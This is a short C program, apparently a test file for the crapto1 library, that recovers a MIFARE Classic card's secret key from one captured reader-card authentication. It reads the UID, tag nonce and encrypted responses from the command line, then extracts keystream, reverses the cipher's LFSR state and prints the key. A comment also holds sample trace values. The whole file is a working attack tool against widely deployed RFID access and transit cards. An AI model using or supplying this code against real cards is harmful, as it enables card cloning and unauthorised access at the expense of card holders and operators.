#define __STDC_FORMAT_MACROS
#include <inttypes.h>
#define llx PRIx64
#define lli PRIi64

// Test-file: test2.c
#include "crapto1.h"
#include <stdio.h>

int main (int argc, char *argv[]) {
  struct Crypto1State *revstate;
  uint64_t key;     // recovered key
  uint32_t uid;     // serial number
  uint32_t nt;      // tag challenge
  uint32_t nr_enc;  // encrypted reader challenge
  uint32_t ar_enc;  // encrypted reader response
  uint32_t at_enc;  // encrypted tag response
  uint32_t ks2;     // keystream used to encrypt reader response
  uint32_t ks3;     // keystream used to encrypt tag response

  printf("MIFARE Classic key recovery - based 64 bits of keystream\n");
  printf("Recover key from only one complete authentication!\n\n");

  if (argc < 6) {
    printf(" syntax: %s <uid> <nt> <{nr}> <{ar}> <{at}>\n\n",argv[0]);
    return 1;
  }

  sscanf(argv[1],"%x",&uid);
  sscanf(argv[2],"%x",&nt);
  sscanf(argv[3],"%x",&nr_enc);
  sscanf(argv[4],"%x",&ar_enc);
  sscanf(argv[5],"%x",&at_enc);

  printf("Recovering key for:\n");
  printf("  uid: %08x\n",uid);
  printf("   nt: %08x\n",nt);
  printf(" {nr}: %08x\n",nr_enc);
  printf(" {ar}: %08x\n",ar_enc);
  printf(" {at}: %08x\n",at_enc);

/*	
  uint32_t uid                = 0x9c599b32;
  uint32_t tag_challenge      = 0x82a4166c;
  uint32_t nr_enc             = 0xa1e458ce;
  uint32_t reader_response    = 0x6eea41e0;
  uint32_t tag_response       = 0x5cadf439;
*/
	// Generate lfsr succesors of the tag challenge
  printf("\nLFSR succesors of the tag challenge:\n");
  printf("  nt': %08x\n",prng_successor(nt, 64));
  printf(" nt'': %08x\n",prng_successor(nt, 96));

  // Extract the keystream from the messages
  printf("\nKeystream used to generate {ar} and {at}:\n");
  ks2 = ar_enc ^ prng_successor(nt, 64);
  ks3 = at_enc ^ prng_successor(nt, 96);
  printf("  ks2: %08x\n",ks2);
  printf("  ks3: %08x\n",ks3);

  revstate = lfsr_recovery64(ks2, ks3);
  lfsr_rollback_word(revstate, 0, 0);
  lfsr_rollback_word(revstate, 0, 0);
  lfsr_rollback_word(revstate, nr_enc, 1);
  lfsr_rollback_word(revstate, uid ^ nt, 0);
  crypto1_get_lfsr(revstate, &key);
  printf("\nFound Key: [%012"llx"]\n\n",key);
  crypto1_destroy(revstate);

  return 0;
}
